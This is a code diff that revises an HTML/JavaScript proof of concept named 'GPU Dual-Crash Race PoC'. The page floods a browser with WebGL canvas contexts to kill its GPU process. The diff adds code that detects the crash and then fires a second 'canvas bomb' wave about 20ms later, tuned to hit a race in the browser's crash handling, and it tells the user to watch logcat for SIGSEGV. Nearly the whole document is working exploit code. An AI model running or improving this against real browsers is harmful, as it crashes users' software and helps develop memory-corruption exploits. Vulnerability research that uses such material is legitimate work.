@@ -2,14 +2,13 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>GPU Dual Crash Race PoC</title>
+  <title>GPU Dual‑Crash Race PoC (Yielded)</title>
 </head>
 <body>
-  <h3>GPU Double‑Crash Race (Canvas Bomb)</h3>
+  <h3>GPU Double‑Crash Race (Yielded + Crash Detection)</h3>
   <p>
-    <label>Delay between waves (ms): <input id="delay" type="number" value="20" step="10" min="0"></label>
     <button id="start">Start Dual Crash</button>
-    <button id="stop" disabled>Stop (if stuck)</button>
+    <button id="stop" disabled>Stop</button>
   </p>
   <pre id="log"></pre>
 
@@ -22,9 +21,24 @@
         console.log(msg);
       };
 
-      // Original crash loop (your exact parameters)
+      // Helper to yield to the event loop for `ms` milliseconds
+      const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+      // Check if the GPU process is alive by trying to create a tiny WebGL context
+      function isGpuProcessAlive() {
+        try {
+          const testCanvas = document.createElement('canvas');
+          testCanvas.width = 1;
+          testCanvas.height = 1;
+          const gl = testCanvas.getContext('webgl2');
+          return gl !== null;
+        } catch(e) {
+          return false;
+        }
+      }
+
       async function crashWave(waveName) {
-        log(`[${waveName}] Starting canvas bomb...`);
+        log(`[${waveName}] Starting canvas bomb with yields...`);
         const attrs = [
           { powerPreference: 'high-performance' },
           { powerPreference: 'low-power' },
@@ -43,58 +57,69 @@
                 if (!gl) continue;
                 gl.clear(gl.COLOR_BUFFER_BIT);
                 gl.flush();
-                // Quick teardown
                 canvas.width = 0;
                 canvas.height = 0;
-              } catch(e) {
-                // Ignore errors – the loop will eventually kill the GPU process
-              }
+              } catch(e) {}
             }
+            // Yield every height step (every 6 attribute attempts) to let GPU breathe
+            await sleep(0);
           }
+          // Extra yield every width step
+          await sleep(10);
         }
         log(`[${waveName}] Canvas bomb finished.`);
       }
 
       let running = false;
-      let stopFlag = false;
 
       document.getElementById('start').addEventListener('click', async () => {
-        if (running) {
-          log('[!] Already running...');
-          return;
-        }
+        if (running) return;
         running = true;
-        stopFlag = false;
         document.getElementById('stop').disabled = false;
 
-        const delay = parseInt(document.getElementById('delay').value) || 20;
+        log('=== Wave 1: Crashing GPU process... ===');
 
-        log('=== First crash wave ===');
-        await crashWave('WAVE1');
+        // Start the first crash wave
+        crashWave('WAVE1');
 
-        log(`Waiting ${delay}ms before second wave...`);
-        await new Promise(r => setTimeout(r, delay));
+        // Wait until the GPU process is dead (context lost)
+        let crashed = false;
+        for (let i = 0; i < 30; i++) {   // wait up to ~30 seconds
+          await sleep(1000);
+          if (!isGpuProcessAlive()) {
+            log('[!] GPU process appears DEAD (context lost).');
+            crashed = true;
+            break;
+          }
+          log('  ...GPU still alive, waiting...');
+        }
 
-        if (stopFlag) {
-          log('Aborted by user.');
+        if (!crashed) {
+          log('[!] GPU did not crash from Wave 1. Aborting race.');
           running = false;
+          document.getElementById('stop').disabled = true;
           return;
         }
 
-        log('=== Second crash wave ===');
-        await crashWave('WAVE2');
+        // Give the browser a moment to start the crash handler, then fire Wave 2
+        log('=== Wave 2: Firing second crash while browser handles first... ===');
+        await sleep(20);  // 20ms delay – tune this to hit the race window
 
-        log('=== Both waves done. Check logcat for race signs! ===');
+        if (!running) return;
+
+        crashWave('WAVE2');
+
+        log('=== Both waves completed. Check logcat for double‑crash logs or SIGSEGV. ===');
         running = false;
         document.getElementById('stop').disabled = true;
       });
 
       document.getElementById('stop').addEventListener('click', () => {
-        stopFlag = true;
-        log('[!] Stop requested – finishing current wave then stopping.');
+        running = false;
+        log('[!] Stopped by user.');
       });
 
-      log('Ready. Configure delay (try 0–50ms) and press "Start Dual Crash".');
+      log('Ready. Press "Start Dual Crash" and watch logcat.');
     })();
   </script>
 </body>
